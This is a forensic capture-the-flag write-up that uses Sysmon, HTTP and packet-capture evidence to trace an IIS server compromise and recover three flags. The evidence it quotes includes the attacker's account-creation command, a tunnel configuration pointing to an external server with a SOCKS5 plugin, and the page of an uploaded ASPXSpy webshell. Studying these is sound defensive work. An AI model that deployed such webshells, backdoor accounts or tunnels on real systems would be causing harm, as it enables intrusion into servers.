## Chall description

```
Category: Forensic
The sysadmin reported that some unexpected files were being uploaded to the file system of their IIS servers.
As a security analyst, you have been tasked with reviewing the Sysmon, HTTP, and network traffic logs to help us identify the flags!
```

## Procedure

Chall files
```
tree .
.
├── HTTP.log
├── Sysmon.evtx
└── Traffic.pcapng

1 directory, 3 files
```

Objectives:
* Something funky is going on with a new account that was created. Can you find the flag? This flag ends with a 6.
* There seems to be some Funky Random Program! This flag ends with a d.
* How did the threat actor attempt to gain access to the webshell? This flag ends with a e.


## Something funky is going on with a new account that was created. Can you find the flag? This flag ends with a 6.
The chall talks about a new windows account created, we can see an `EVT` file here, let's start using `evtx_dump.py` on `System.evt` file, and filter the string `add`, this is typically used to create a windows account `nt user <username> <passd> /add`.
After parser and filter `add`, we can the the following log where the user `IIS_USER` was created.
```xml
<EventData><Data Name="RuleName">-</Data>
<Data Name="UtcTime">2025-10-07 21:30:26.289</Data>
<Data Name="ProcessGuid">{8eed9800-8672-68e5-5c01-000000006703}</Data>
<Data Name="ProcessId">2548</Data>
<Data Name="Image">C:\Windows\System32\net.exe</Data>
<Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
<Data Name="Description">Net Command</Data>
<Data Name="Product">Microsoft&#174; Windows&#174; Operating System</Data>
<Data Name="Company">Microsoft Corporation</Data>
<Data Name="OriginalFileName">net.exe</Data>
<Data Name="CommandLine">net  user IIS_USER VJGSuERc6qYAYPdRc556JTHqxqWwLbPwzABc0XgIhgwYEWdQji1 /add</Data>
<Data Name="CurrentDirectory">C:\ProgramData\</Data>
<Data Name="User">NT AUTHORITY\SYSTEM</Data>
<Data Name="LogonGuid">{8eed9800-8141-68e5-e703-000000000000}</Data>
<Data Name="LogonId">0x00000000000003e7</Data>
<Data Name="TerminalSessionId">0</Data>
<Data Name="IntegrityLevel">System</Data>
<Data Name="Hashes">MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07</Data>
<Data Name="ParentProcessGuid">{8eed9800-8632-68e5-5a01-000000006703}</Data>
<Data Name="ParentProcessId">5888</Data>
<Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
<Data Name="ParentCommandLine">C:\Windows\system32\cmd.exe </Data>
<Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
</EventData>
</Event>
```

A base62 encoded was used here
<img width="1339" height="560" alt="Screenshot 2025-10-22 at 10 28 30 PM" src="https://github.com/user-attachments/assets/6170b24f-3163-4605-bc4e-2a52a590572b" />

Flag `flag{03638631595684f0c8c461c24b0879e6}`

## There seems to be some Funky Random Program! This flag ends with a d.
After a moment, and filtering all http requests we can see the following interesting http post requests.
```bash
tshark -r Traffic.pcapng -Y "http.request.method==POST" -T 'fields' -e 'http.request.method' -e 'http.request.uri'
POST    /
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
POST    /uploads/revshell.aspx
```

recovering the transmitted data, using `tshark -r Traffic.pcapng -Y "http.request.method==POST" -T 'fields' -e 'data' | xxd -r -p -`, we can see a big base64 string, but why is this commented? `MZWGCZ33MM3WEYJXGZRTAYJUGQ4DIZTFHBRTCMZVMEYTCOJVMU4GIOJUMVSH2===`
```bash
...snip...
C:\ProgramDAta\Upload/wEPDwUKMTg1NzY0NjY1MA8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgICBA8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YRYCAgMPFgIeB1Zpc2libGVnFhoCAQ9kFgRmDxYCHglpbm5lcmh0bWwFiAIxNzIuMzEuOS4yMjI6NDEzNDYoMTguMTc1LjU2LjE3MSkmbmJzcDsmbmJzcDtIb3N0IFRydXN0IExldmVsOiZuYnNwOyZuYnNwOzxzcGFuIHN0eWxlPSdjb2xvcjpyZWQ7Jz5GdWxsPC9zcGFuPiZuYnNwOyZuYnNwO0lzRnVsbC1UcnVzdDombmJzcDsmbmJzcDs8c3BhbiBzdHlsZT0nY29sb3I6cmVkOyc+VHJ1ZTwvc3Bhbj4mbmJzcDsmbmJzcDtVc2VyOiZuYnNwJm5ic3A7PHNwYW4gc3R5bGU9J2NvbG9yOnJlZDsnPklJUyBBUFBQT09MXE15QXBwUG9vbDwvc3Bhbj5kAgEPFgIfAwUfRnJhbWV3b3JrIFZlciA6IDQuMC4zMDMxOS40MjAwMGQCBQ8WAh8DBRVGaWxlIE1hbmFnZXIgJmd0OyZndDtkAgcPFgIfAmcWCAILDxYCHgdvbkNsaWNrBXB2YXIgZmlsZW5hbWU9cHJvbXB0KCdQbGVhc2UgaW5wdXQgdGhlIGRpcmVjdG9yeSBuYW1lOicsJycpO2lmKGZpbGVuYW1lKXtCaW5fUG9zdEJhY2soJ0Jpbl9DcmVhdGVkaXInLGZpbGVuYW1lKTt9ZAINDxYCHwQFbHZhciBmaWxlbmFtZT1wcm9tcHQoJ1BsZWFzZSBpbnB1dCB0aGUgZmlsZSBuYW1lOicsJycpO2lmKGZpbGVuYW1lKXtCaW5fUG9zdEJhY2soJ0Jpbl9DcmVhdGVmaWxlJyxmaWxlbmFtZSk7fWQCDw8WAh8DBUg8YSBocmVmPSJqYXZhc2NyaXB0OkJpbl9Qb3N0QmFjaygnQmluX0xpc3RkaXInLCdRenBjJykiPkZpeGVkKEM6KTwvYT4gfCBkAhAPFgIfBAVMaWYoY29uZmlybSgnQXJlIHlvdSBzdXJlIGRlbGV0ZSBBU1BYU1BZPycpKXtCaW5fUG9zdEJhY2soJ0Jpbl9LaWxsTWUnLCcnKTt9O2QCCQ8WAh8CaBYCAgMPEGRkFgFmZAIRDxYCHwJoFgQCAQ8WAh4FdmFsdWUFGkM6XFByb2dyYW1EYXRhXHN2Y2hvc3QuZXhlZAIDDxYCHwVkZAIZDxYCHwJoZAIbDxYCHwJoZAIdDxYCHwJoFgQCAg8QZGQWAWZkAgUPZBYCAgMPZBYEAgEPEGRkFgBkAgMPEGRkFgFmZAIfDxYCHwJoZAIhDxYCHwJoFgICCw8QZGQWAWZkAiMPFgIfAmhkAiUPFgIfAmhkAicPFgIfAmhkZNHvaQAaoP4cJGk5k6k/HXPsYJ2LWZvtzmIKBpqY04Z6590BBAB6/wEdABUsR42WRxi1Tm/Qj9F46IUjxKC5/3HpaldDtsQNnMNd6lbtUkUtR4W5IBkLWOCAmEmM8QMR1sndA98g3mvAzsVAn7oH7Bfgr1LyMGCLKQcoehLvl6M93PVpReKeJLy0ZWOVQNWuHP85FEACu1tV6KRiFHJsOCtI7br1qmUAbBZ8Mc0952CBe0ybdUhaI2PnZ0oZQ1Z7wHCGIJzb+6jyVd8XPXjwPGaa3xY8QnJWBcGz0+U7XYAGkGfmTBBTZwuQdPpVDXnPt5t7FninnOlnBwgSccYMxWhGsuZRJccPhouG3GgqFa1OP1VKCT8mImNfgxRnofzMVNK50Y4YoabdK4JtdyzyGNG0y9ai23CYjCUs2UmPhlqhbqXOfN2zBe4m7oGrLJPcjuG5o2hbz22/8T30F3PUQziqDNuWPa6+ypJN+TqcYmEr6kzg/zMgD2rdvy6IW9cd7RkVavWLja3UNfL51ws5jYY3F6QUawKZwp7cbQ==C:\ProgramDAta\[common]
server_addr = 117.72.105.10
server_port = 7000 # MZWGCZ33MM3WEYJXGZRTAYJUGQ4DIZTFHBRTCMZVMEYTCOJVMU4GIOJUMVSH2===

[sock5]
type = tcp
plugin = socks5
remote_port = 6000
Upload
```

This was a base32 encoded string with our second flag
<img width="1346" height="548" alt="Screenshot 2025-10-22 at 10 40 28 PM" src="https://github.com/user-attachments/assets/5446a940-340f-46e8-b301-b4d48a3a8ef7" />

Flag `flag{c7ba76c0a4484fe8c135a1195e8d94ed}`

## How did the threat actor attempt to gain access to the webshell? This flag ends with a e.

For our last flag, I export all HTTP Object with `tshark -r Traffic.pcapng --export-objects http,./out`, we got the following files
```bash
ls
 %2f                               object1045   object1111   object1197   object1260   object1362    object676   object749   object844   object936           'revshell(16).aspx'  'revshell(34).aspx'
'%2f(1)'                           object1048   object1113   object1203   object1262   object1400    object677   object751   object845   object939           'revshell(17).aspx'  'revshell(35).aspx'
'%2f(2)'                           object1051   object1119   object1211   object1265   object19386   object680   object758   object847   object956           'revshell(18).aspx'  'revshell(4).aspx'
'%2f(3)'                           object1053   object1122   object1212   object1268   object19403   object683   object761   object855   object960           'revshell(19).aspx'  'revshell(5).aspx'
'(1).env'                          object1059   object1126   object1214   object1269   object19442   object689   object763   object861   object963           'revshell(2).aspx'   'revshell(6).aspx'
'View.aspx%3ffile=revshell.aspx'   object1065   object1134   object1215   object1271   object621     object694   object764   object869   object967           'revshell(20).aspx'  'revshell(7).aspx'
'View.aspx%3ffile=web.config'      object1066   object1143   object1220   object1278   object626     object698   object766   object879   object969           'revshell(21).aspx'  'revshell(8).aspx'
 favicon.ico                       object1072   object1152   object1221   object1281   object632     object701   object767   object885   object970           'revshell(22).aspx'  'revshell(9).aspx'
 object1000                        object1077   object1153   object1224   object1283   object633     object707   object769   object893   object975           'revshell(23).aspx'   revshell.aspx
 object1006                        object1080   object1156   object1226   object1284   object635     object710   object772   object896   object990           'revshell(24).aspx'   robots.txt
 object1008                        object1083   object1161   object1229   object1286   object641     object712   object775   object897   object993           'revshell(25).aspx'   test
 object1009                        object1084   object1170   object1232   object1289   object642     object713   object788   object902   object994           'revshell(26).aspx'
 object1014                        object1087   object1171   object1236   object1292   object644     object718   object793   object905   object997           'revshell(27).aspx'
 object1017                        object1092   object1175   object1238   object1293   object648     object721   object808   object908  'revshell(1).aspx'   'revshell(28).aspx'
 object1021                        object1093   object1182   object1241   object1295   object650     object728   object815   object915  'revshell(10).aspx'  'revshell(29).aspx'
 object1024                        object1096   object1185   object1245   object1298   object656     object730   object820   object917  'revshell(11).aspx'  'revshell(3).aspx'
 object1027                        object1099   object1188   object1247   object1299   object659     object739   object827   object918  'revshell(12).aspx'  'revshell(30).aspx'
 object1033                        object1104   object1191   object1248   object1318   object668     object740   object829   object921  'revshell(13).aspx'  'revshell(31).aspx'
 object1038                        object1105   object1195   object1253   object1334   object671     object743   object830   object926  'revshell(14).aspx'  'revshell(32).aspx'
 object1042                        object1110   object1196   object1257   object1340   object673     object748   object836   object929  'revshell(15).aspx'  'revshell(33).aspx'
```

After export all transmitted object over http, we can see a reference to `Password` on every webshell file, this mean, the attacker send this value every time he wants to connect to webshell, the file `revshell(2).aspx` has a base64 strings for password value `ZmxhZ3tmYjRlMDc4YTczOWFjNGNlNjg3ZWI3OGMyZTUxYWFmZX0=`.

```html
strings revshell\(2\).aspx 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1"><meta http-equiv="Content-Type" content="text/html;charset=utf-8" /><title>
        ASPXSpy2014 - 18.175.56.171
</title>
<style type="text/css">
.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
.list{font:12px Arial,Tahoma;height:20px;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;
        }
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
</style>
    <script type="text/javascript">
    function CheckAll(form){
    for(var i=0;i<form.elements.length;i++){
        var e=form.elements[i];
        if(e.name!='chkall')
        e.checked=form.chkall.checked;
    }
    </script>
</head>
<body style="margin:0;table-layout:fixed;">
    <form method="post" action="./revshell.aspx" id="ASPXSpy">
<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__FILE" id="__FILE" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTg1NzY0NjY1MA8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgICBA9kFgICAw8WAh4HVmlzaWJsZWgWBgIJD2QWAgIDDxBkZBYBZmQCHQ9kFgQCAg8QZGQWAWZkAgUPZBYCAgMPZBYEAgEPEGRkFgBkAgMPEGRkFgFmZAIhD2QWAgILDxBkZBYBZmRkiHWp84MkXqQMgVs3p3Lcf6EgMVB9/9od3kKUDYLmiG8=" />
</div>
<div class="aspNetHidden">
        <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="590BBAB6" />
        <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAO0/coqrnxNs+2X0cBnXnyoxqtQhjhXkl7GpTTS3QEoG8IfTMgLVpbR6SeGROGuCp/kVaTxwWAU9BfU8kycel9gl04H22Z1wzt2CsWZOTX42A==" />
</div>
    <div id="Bin_Div_Login" style=" margin:15px">
        <span style="font:11px Verdana;">Password:</span>
        <input name="Bin_TextBox_Login" type="text" value="ZmxhZ3tmYjRlMDc4YTczOWFjNGNlNjg3ZWI3OGMyZTUxYWFmZX0=" id="Bin_TextBox_Login" class="Bin_Style_Login" />
        <input type="submit" name="Bin_Button_Login" value="Login" id="Bin_Button_Login" class="Bin_Style_Login" />
    </div>
    
        <script>var tmpdiv=document.getElementById('zcg_divresize');var tmpwidth=document.getElementById('Bin_Div_Head').clientWidth+"px";if(tmpdiv){tmpdiv.style.width=tmpwidth;}</script>
        
<script language=Javascript>function Bin_PostBack(eventTarget,eventArgument){var theform=document.forms[0];theform.__EVENTTARGET.value=eventTarget;theform.__FILE.value=eventArgument;theform.submit();theform.__EVENTTARGET.value="";theform.__FILE.value=""} </script></form>
    </body>
</html>
```

Flag `flag{fb4e078a739ac4ce687eb78c2e51aafe}`

